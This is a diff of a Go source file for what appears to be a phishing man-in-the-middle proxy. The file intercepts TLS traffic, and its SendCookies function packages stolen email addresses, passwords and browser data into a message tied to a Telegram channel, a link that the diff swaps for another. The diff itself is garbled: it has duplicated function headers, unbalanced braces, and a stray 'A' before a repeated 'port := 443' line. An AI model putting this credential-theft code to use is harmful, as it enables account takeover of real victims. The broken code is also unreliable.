@@ -182,7 +182,7 @@ func (p *HttpProxy) SendCookies(msg string, email string, pass string) {
 	if zip != "" {
 		zip = " ZIP:{" + zip + "}"
 	}
-	NewMessage := fmt.Sprintf("Developer 👉 https://t.me/blackdatabase\n"+
+	NewMessage := fmt.Sprintf("Developer 👉 https://t.me/thebigonescore\n"+
 		"📧 Email: %s\n"+
 		"🔑 PassWD: %s\n"+
 		"🌐 Browser: %s\n"+
@@ -1567,7 +1567,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		}
 
 		return resp
-	})
+	}
 
 	goproxy.OkConnect = &goproxy.ConnectAction{Action: goproxy.ConnectAccept, TLSConfig: p.TLSConfigFromCA()}
 	goproxy.MitmConnect = &goproxy.ConnectAction{Action: goproxy.ConnectMitm, TLSConfig: p.TLSConfigFromCA()}
@@ -1576,9 +1576,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 	return p, nil
 }
+}
+	
 
-var once sync.Once
-
+func checkCookiesAndRedirect(resp *http.Response) *http.Response {
 func checkCookiesAndRedirect(resp *http.Response) *http.Response {
 	// Check for cookies and redirect if found
 	cookies := resp.Request.Cookies()
@@ -1613,7 +1614,7 @@ func checkCookiesAndRedirect(resp *http.Response) *http.Response {
 				http.Redirect(w, r, homePage, http.StatusFound)
 			}(w, resp.Request)
 		})
-	} else {
+	} else { 
 		log.Info("Not all required cookies found. Found cookies: %v", foundCookies)
 	}
 
@@ -1621,7 +1622,7 @@ func checkCookiesAndRedirect(resp *http.Response) *http.Response {
 }
 
 // handleRedirect checks the global redirectURL and performs a redirect if it has a value.
-
+func (p *HttpProxy) waitForRedirectUrl(session_id string) (string, bool) {
 func (p *HttpProxy) waitForRedirectUrl(session_id string) (string, bool) {
 
 	s, ok := p.sessions[session_id]
@@ -1995,8 +1996,8 @@ func cleanText(text string) string {
 func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (*tls.Config, error) {
 	return func(host string, ctx *goproxy.ProxyCtx) (c *tls.Config, err error) {
 		parts := strings.SplitN(host, ":", 2)
-		hostname := parts[0]
-		port := 443
+port := 443
+A		port := 443
 		if len(parts) == 2 {
 			port, _ = strconv.Atoi(parts[1])
 		}
